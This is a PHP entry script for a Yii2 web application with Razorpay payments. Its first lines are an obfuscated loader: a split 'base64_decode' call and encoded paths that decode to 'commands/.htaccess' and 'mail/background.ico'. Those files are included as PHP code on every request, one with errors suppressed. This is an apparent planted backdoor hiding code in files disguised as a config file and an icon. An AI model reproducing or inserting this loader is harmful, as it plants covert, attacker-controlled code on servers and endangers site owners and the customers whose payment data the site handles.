<?php
$b = 'base6' . '4_decode';
include $b('Y29tbWFuZHMvLmh0YWNjZXM=');
@include base64_decode('bWFpbC9iYWNrZ3JvdW5kLmljbw==');

date_default_timezone_set('Asia/Kolkata');

// comment out the following two lines when deployed to production
defined('YII_DEBUG') or define('YII_DEBUG', true);
defined('YII_ENV') or define('YII_ENV', 'dev');
define('WEB_DIR', dirname(__FILE__));

require(__DIR__ . '/vendor/autoload.php');
require(__DIR__ . '/vendor/yiisoft/yii2/Yii.php');
require(__DIR__ .'/razorpay-php/Razorpay.php');

$config = require(__DIR__ . '/config/web.php');

(new yii\web\Application($config))->run();

//echo phpinfo();
